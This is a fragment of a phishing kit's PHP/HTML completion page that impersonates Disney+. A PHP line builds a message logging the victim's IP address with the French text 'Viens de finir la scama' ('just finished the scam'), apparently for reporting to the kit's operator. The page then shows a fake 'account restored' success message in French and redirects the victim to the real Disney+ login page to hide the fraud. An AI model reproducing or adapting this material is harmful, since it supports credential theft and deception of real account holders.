...
$message = '
ㅤ
'.$_SERVER['REMOTE_ADDR'].' Viens de finir la scama
ㅤ
';    
        ...
        <div id="app_body_content" data-testid="adult-enabled-profile">
            ...
            <div id="webAppScene">
                ...
                <div id="content" class="contentContainerXhr">
                    ...
                    <br>
                     <h1 align="center" class="h1redirect">Mise à jour réussie!</h1>
					<h1 align="center" class="h1redirect">Votre compte est maintenant rétabli.</h1>
                     <br><br>
                     <div align="center" class="redirecting">Redirection...</div>
                </div>
								<?php header('Refresh:'.$timer_end.';URL=https://www.disneyplus.com/login'); ?>
							</div></div>
                    </main>
                </div>
            </div>
